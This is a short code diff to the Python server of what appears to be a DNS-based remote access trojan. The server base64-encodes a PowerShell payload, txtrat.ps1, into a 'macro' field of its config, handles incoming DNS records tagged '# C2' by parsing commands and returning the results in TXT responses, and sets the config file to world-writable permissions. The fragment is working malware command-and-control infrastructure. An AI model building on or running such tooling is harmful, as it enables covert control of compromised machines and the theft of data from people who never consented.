@@ -2,7 +2,7 @@ import socket
 import json
 import threading
 from optparse import OptionParser
-from os import path
+import os
 import base64
 
 import request
@@ -55,17 +55,18 @@ def main():
     execute = options.execute
 
     # setup manage.json if the file doesn't exist.  txtrat.ps1 is needed to fill macro key
-    if not path.exists("./manage.json"):
+    if not os.path.exists("./manage.json"):
         with settings.lock:
             manage = settings.initmanage
 
-            with open('./txtrat.ps1', 'r') as f:
+            with open('../txtrat.ps1', 'rb') as f:
                 data = f.read()
 
-            manage["macro"] = base64.b64encode(data.encode("utf-16")).decode()
+            manage["macro"] = base64.b64encode(data).decode()
 
             with open('./manage.json', 'w') as f:
                 json.dump(manage, f)
+            os.chmod('./manage.json', 0o777)
 
     x = threading.Thread(target=console.newConsole, args=())
     x.start()
@@ -90,7 +91,7 @@ def main():
         if len(cmddata) > 0 and rectype == b'\x00\x10':         # C2
             #print(cmddata)
             returndata = command.parsecommand(cmddata)
-            if returndata == "":
+            if not returndata:
                 continue
             dnsanswerbody = response.genTxtResponse(records, returndata)
         else:                                                   # non C2
